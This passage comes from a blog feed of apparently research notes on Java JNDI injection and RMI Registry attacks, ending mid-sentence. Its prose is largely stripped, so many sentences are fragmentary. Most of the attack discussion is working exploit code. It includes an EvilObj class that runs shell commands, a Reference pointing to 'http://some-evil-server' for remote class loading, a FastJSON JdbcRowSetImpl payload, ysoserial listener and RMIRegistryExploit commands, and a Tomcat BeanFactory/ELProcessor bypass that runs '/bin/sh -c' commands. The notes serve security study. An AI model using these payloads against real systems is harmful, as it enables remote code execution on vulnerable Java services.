service indirectly by binding a reference that could be decoded by the Naming Manager and resolved to the original object.</p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p></blockquote><p>objJNDINaming ReferencesReferenceobjJNDIobjcodebase</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String FactoryURL = <span class="string">"http://some-evil-server"</span>;</span><br><span class="line">Reference reference = <span class="keyword">new</span> Reference(<span class="string">"MyClass"</span>,<span class="string">"MyClass"</span>,FactoryURL);</span><br><span class="line">ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">ctx.bind(<span class="string">"Foo"</span>, wrapper);<span class="comment">// reference</span></span><br></pre></td></tr></table></figure><p>lookupRMI<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p><p><img src="/images/jndi-with-rmi-20200209/image-20200204164815153-1255889.png" alt="image-20200204164815153"></p><h2 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h2><h3 id="JNDI-with-RMI-DEMO"><a href="#JNDI-with-RMI-DEMO" class="headerlink" title="JNDI with RMI DEMO"></a>JNDI with RMI DEMO</h3><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> train.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wh1t3P1g</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2020/2/4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        String FactoryURL = <span class="string">"http://localhost/"</span>;</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"EvilObj"</span>,<span class="string">"EvilObj"</span>,FactoryURL);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"Foo"</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ServerRMI RegistryReferencefactoryURLlocalhost</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> train.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wh1t3P1g</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2020/2/4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(<span class="string">"rmi://localhost:1099/Foo"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ClientlookupRMI URLEvilObjClient(jndilookup)EvilObj</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wh1t3P1g</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2020/2/4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObj</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"open /System/Applications/Calculator.app"</span>&#125;;</span><br><span class="line">        rt.exec(commands);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>javac EvilObj.java</code>EvilObj.classwebpython</p><p>lookup</p><p>InitialContextlookupURLInitialContextInitialContextrmiURLContext</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204203703902-1255889.png" alt="image-20200204203703902"></p><p><code>com/sun/jndi/toolkit/url/GenericURLContext.java#lookup</code></p><p><img src="/images/jndi-with-rmi-20200209/image-20200204204303412-1255889.png" alt="image-20200204204303412"></p><p>ctxRegistryContextRMI Registryobj</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204204444118-1255889.png" alt="image-20200204204444118"></p><p>decodeObject</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204205121493-1255889.png" alt="image-20200204205121493"></p><p>remoteRemoteReferenceRegistryReferenceServerClientReference</p><p>getObjectInstance</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204205638427-1255889.png" alt="image-20200204205638427"></p><p>NamingManagergetObjectFactoryFromReferenceFactoryURLclass</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204210107747-1255889.png" alt="image-20200204210107747"></p><p>factoryNamecodebaseclass(loadClassURLClassLoader)</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204210025714-1255889.png" alt="image-20200204210025714"></p><p>163objpayload</p><p>lookup</p><h3 id="SpringJtaTransactionManager"><a href="#SpringJtaTransactionManager" class="headerlink" title="SpringJtaTransactionManager"></a>SpringJtaTransactionManager</h3><p>16SpringJtaTransactionManagerJNDI lookup</p><p><code>org/springframework/transaction/jta/JtaTransactionManager.java#readObject</code></p><p><img src="/images/jndi-with-rmi-20200209/image-20200205222725185-1255889.png" alt="image-20200205222725185"></p><p>1230jdnicontextcontextJNDI lookup</p><p>initUserTransactionAndTranscationManager</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205222908751-1255889.png" alt="image-20200205222908751"></p><p>lookupUserTransaction</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205223002181-1255889.png" alt="image-20200205223002181"></p><p>contextlookupuserTransactionName(ysoserialspring3)</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205223116317-1255889.png" alt="image-20200205223116317"></p><p>2020Spring-txXD</p><h3 id="FastJSONPOC-JdbcRowSetImpl"><a href="#FastJSONPOC-JdbcRowSetImpl" class="headerlink" title="FastJSONPOC JdbcRowSetImpl"></a>FastJSONPOC JdbcRowSetImpl</h3><p>fastjson<code>@type</code>setter/getterPOC</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/obj"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>autoCommitJdbcRowSetImplsetAutoCommit</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205125555341-1255889.png" alt="image-20200205125555341"></p><p>connnullconnectconnect</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205125714780-1255889.png" alt="image-20200205125714780"></p><p>JNDIfastjsondataSourcelookupserverJNDI</p><h2 id="0x03-"><a href="#0x03-" class="headerlink" title="0x03 "></a>0x03 </h2><h3 id="JRMPListener"><a href="#JRMPListener" class="headerlink" title="JRMPListener"></a>JRMPListener</h3><p>JNDIRMIReferenceRMIJRMPListener</p><p>RMIJRMPListenerExceptionalReturnExceptionClientReferenceExceptionalReturnNormalReturnpayloadObjectReferenceWrapper</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205154116235-1255889.png" alt="image-20200205154116235"></p><p>payloadObjectReferenceWrapper</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205154412920-1255889.png" alt="image-20200205154412920"></p><p>Client</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205155851653-1255889.png" alt="image-20200205155851653"></p><p>XD</p><p><a href="https://github.com/wh1t3p1g/ysoserial" target="_blank" rel="noopener">github</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// evil classHTTP Server</span><br><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.PayloadHTTPServer 80 EvilObj <span class="string">"open /System/Applications/Calculator.app"</span></span><br><span class="line"></span><br><span class="line">// RMI Reference Listener</span><br><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 1099 EvilObj http://localhost/</span><br><span class="line"></span><br><span class="line">// RMIRefListener2</span><br><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 localhost:1099 80 EvilObj <span class="string">"open /System/Applications/Calculator.app"</span></span><br></pre></td></tr></table></figure><h3 id="FastJSON-1-2-24-RCE"><a href="#FastJSON-1-2-24-RCE" class="headerlink" title="FastJSON 1.2.24 RCE"></a>FastJSON 1.2.24 RCE</h3><p>FastJSON 1.2.24RCEJNDI</p><p>evil rmi server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 host:1099 80 EvilObj <span class="string">"touch /tmp/success"</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/vulhub/vulhub/blob/master/fastjson/1.2.24-rce/README.md" target="_blank" rel="noopener">vulhub</a></p><p><img src="/images/jndi-with-rmi-20200209/image-20200206144653206-1255889.png" alt="image-20200206144653206"></p><p></p><p><img src="/images/jndi-with-rmi-20200209/image-20200206144749240-1255889.png" alt="image-20200206144749240"></p><p>dockersuccess</p><p><img src="/images/jndi-with-rmi-20200209/image-20200206144824977-1255889.png" alt="image-20200206144824977"></p><h2 id="0x04-"><a href="#0x04-" class="headerlink" title="0x04 "></a>0x04 </h2><p>JDK8u111JDK8u113JDK6u132, JDK7u122codebase</p><blockquote><p> com.sun.jndi.rmi.object.trustURLCodebasecom.sun.jndi.cosnaming.object.trustURLCodebase falseCodebaseReference RMI Registry  COS Naming Service Providertrue</p><p>Changelog:</p><ul><li>JDK 6u141 <a href="http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141</a></li><li>JDK 7u131 <a href="http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html</a></li><li>JDK 8u121 <a href="http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html</a></li></ul><p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p></blockquote><p>JDKbypass</p><blockquote><ol><li>CLASSPATHReference FactoryFactory</li><li>LDAPJNDIGadget</li></ol><p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p></blockquote><p></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>LDAPRMI</p><p><a href="http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/">Java RMI</a>JRMPListenerRMI ClientExceptionJNDIRMI(RMI)ysoserialJRMPListener<code>com.sun.jndi.rmi.object.trustURLCodebase</code>trueJDK</p><h3 id="Factory"><a href="#Factory" class="headerlink" title="Factory"></a>Factory</h3><p></p><p>NamingManagergetObjectFactoryFromReferencefactory</p><p><img src="/images/jndi-with-rmi-20200209/image-20200206163723977-1255889.png" alt="image-20200206163723977"></p><p>CLASSPATHfactoryNamefactoryJNDI</p><p>tomcatglassfishBeanFactory</p><p>factorygetObjectInstance</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ref Reference </span></span><br><span class="line"><span class="comment">// name factoryname*EvilObj* </span></span><br><span class="line">factory.getObjectInstance(ref, name, nameCtx, environment);</span><br></pre></td></tr></table></figure><p>BeanFactorygetObjectInstance</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                Reference ref = (Reference) obj;</span><br><span class="line">                String beanClassName = ref.getClassName();</span><br><span class="line">                Class&lt;?&gt; beanClass = <span class="keyword">null</span>;</span><br><span class="line">                ClassLoader tcl =</span><br><span class="line">                    Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (tcl != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = tcl.loadClass(beanClassName);<span class="comment">// class</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = Class.forName(beanClassName);<span class="comment">// class</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                Object bean = beanClass.newInstance();<span class="comment">// </span></span><br></pre></td></tr></table></figure><p>ReferenceResourceRefResourceRefbeanClassshilihuanewInstance(class)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">RefAddr ra = ref.get(<span class="string">"forceString"</span>);</span><br><span class="line">Map&lt;String, Method&gt; forced = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">String value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">    value = (String)ra.getContent();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Items are given as comma separated list */</span></span><br><span class="line">    <span class="keyword">for</span> (String param: value.split(<span class="string">","</span>)) &#123;</span><br><span class="line">        param = param.trim();</span><br><span class="line"></span><br><span class="line">        index = param.indexOf(<span class="string">'='</span>);</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;<span class="comment">// ==</span></span><br><span class="line">            setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setterName = <span class="string">"set"</span> +</span><br><span class="line">                         param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                         param.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            forced.put(param,</span><br><span class="line">                       beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">        &#125; <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ReferenceRef<code>get</code><code>ref.get(&quot;forceString&quot;)</code>forceStringRefAddrRefAddrgetContentforceString</p><p>forceString<code>=</code><code>=</code>force<code>=</code>Method<code>test=eval</code>,evalMethod</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line"></span><br><span class="line">    ra = e.nextElement();</span><br><span class="line">    String propName = ra.getType();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (propName.equals(Constants.FACTORY) ||</span><br><span class="line">        propName.equals(<span class="string">"scope"</span>) || propName.equals(<span class="string">"auth"</span>) ||</span><br><span class="line">        propName.equals(<span class="string">"forceString"</span>) ||</span><br><span class="line">        propName.equals(<span class="string">"singleton"</span>)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    value = (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">    Object[] valueArray = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Shortcut for properties with explicitly configured setter */</span></span><br><span class="line">    Method method = forced.get(propName);</span><br><span class="line">    <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">        valueArray[<span class="number">0</span>] = value;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method.invoke(bean, valueArray);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException|</span><br><span class="line">                 IllegalArgumentException|</span><br><span class="line">                 InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NamingException</span><br><span class="line">                (<span class="string">"Forced String setter "</span> + method.getName() +</span><br><span class="line">                 <span class="string">" threw exception for property "</span> + propName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>ref.getAll</code>RefAddr<code>Constants.FACTORY/scope/auth/forceString/singleton</code>MethodRefAddrRefAddrtype<code>test</code><code>eval</code>Method</p><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload from kingx</span></span><br><span class="line">ResourceRef ref = <span class="keyword">new</span> ResourceRef(</span><br><span class="line">    <span class="string">"javax.el.ELProcessor"</span>,<span class="comment">// bean class</span></span><br><span class="line">    <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>,</span><br><span class="line">    <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="comment">// factory class</span></span><br><span class="line">    <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"KINGX=eval"</span>));<span class="comment">// evalMethod</span></span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"KINGX"</span>,</span><br><span class="line">    <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\")"</span> +</span><br><span class="line">        <span class="string">".newInstance().getEngineByName(\"JavaScript\")"</span> +</span><br><span class="line">        <span class="string">".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']("</span> +</span><br><span class="line">        <span class="string">"['/bin/sh','-c','"</span>+ command +<span class="string">"'])"</span> +</span><br><span class="line">        <span class="string">".start()\")"</span>));<span class="comment">// evalel</span></span><br></pre></td></tr></table></figure><h2 id="0x05-"><a href="#0x05-" class="headerlink" title="0x05 "></a>0x05 </h2><p>JNDI with RMIJNDI lookupJNDIRMIJNDI Naming Managercodebasebytecodes</p><p>JDK8u113JDK6u132,JDK7u122JDKCLASSPATHtomcatObjectFactory</p><p>FactorykingxObjectFactoryflagXD</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notesJava RMI Registry</title>
      <link href="2020/02/06/java/rmi-registry-security-problem/"/>
      <url>2020/02/06/java/rmi-registry-security-problem/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h2><p>Java RMI RegistryRegistryClientServer</p><a id="more"></a><h2 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h2><p>Java RMI<a href="https://xz.aliyun.com/t/2223" target="_blank" rel="noopener">1</a></p><h3 id="Registry-bind-rebind"><a href="#Registry-bind-rebind" class="headerlink" title="Registry bind/rebind"></a>Registry bind/rebind</h3><p> Clientbindrebind<code>remote obj</code><code>sun/rmi/registry/RegistryImpl_Skel.java#dispatch</code></p><p>JDK8u141</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200317175519024.png" alt="image-20200317175519024"></p><p>readObjectJava</p><p>bindrebindRMI Registry</p><h4 id="bind-rebind"><a href="#bind-rebind" class="headerlink" title="bind/rebind"></a>bind/rebind</h4><p>Registrybind/rebindRegistry</p><p></p><p>JDK 8u141<code>readObject</code>putcheckAccess</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200317175608779.png" alt="image-20200317175608779"></p><p>JDK 8u141<code>sun/rmi/registry/RegistryImpl_Skel.java#dispatch</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200317181813002.png" alt="image-20200317181813002"></p><p></p><p>bind/rebindRegistryJDK8u141</p><h3 id="Registrylookup"><a href="#Registrylookup" class="headerlink" title="Registrylookup"></a>Registrylookup</h3><p>bind/rebind141Registry</p><p>RMIRegistrylookuplookup</p><p><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>lookup</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200512141031125.png" alt="image-20200512141031125"></p><p>lookupbind/rebindlookup141registry</p><p>lookuplookupNaming.lookupRegistryImpl_Stub.lookupObject</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200512141411217.png" alt="image-20200512141411217"></p><h2 id="0x02-Registry-jdk-lt-8u121"><a href="#0x02-Registry-jdk-lt-8u121" class="headerlink" title="0x02 Registry jdk&lt;8u121"></a>0x02 Registry jdk&lt;8u121</h2><p>jdk8u111RMI Registryremote objRemote<a href="https://www.freebuf.com/vuls/126499.html" target="_blank" rel="noopener">2</a></p><p>ysoserial<code>ysoserial.exploit.RMIRegisterExploit</code>Remote</p><p></p><p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit RMIRegisterHost RMIRegisterPort CommonsCollections7 &quot;open /System/Applications/Calculator.app&quot;</code></p><h3 id="ysoserial-exploit-RMIRegisterExploit"><a href="#ysoserial-exploit-RMIRegisterExploit" class="headerlink" title="ysoserial.exploit.RMIRegisterExploit"></a>ysoserial.exploit.RMIRegisterExploit</h3><p>java.rmi.RemoteysoserialRemotehandlerCommonsCollectionsAnnotationInvocationHandlerhandlermemberValues</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110145154688.png" alt="image-20200110145154688"></p><p>bindremote</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110145346319.png" alt="image-20200110145346319"></p><h2 id="0x03-Registry-jdk-lt-8u232-b09"><a href="#0x03-Registry-jdk-lt-8u232-b09" class="headerlink" title="0x03 Registry jdk&lt;8u232_b09"></a>0x03 Registry jdk&lt;8u232_b09</h2><p>jdk8u121<code>sun/rmi/registry/RegistryImpl.java#registryFilter</code></p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (String<span class="class">.<span class="keyword">class</span> </span>== clazz</span><br><span class="line">        || java.lang.Number<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">Remote</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">lang</span>.<span class="title">reflect</span>.<span class="title">Proxy</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">UnicastRef</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">RMIClientSocketFactory</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">RMIServerSocketFactory</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">activation</span>.<span 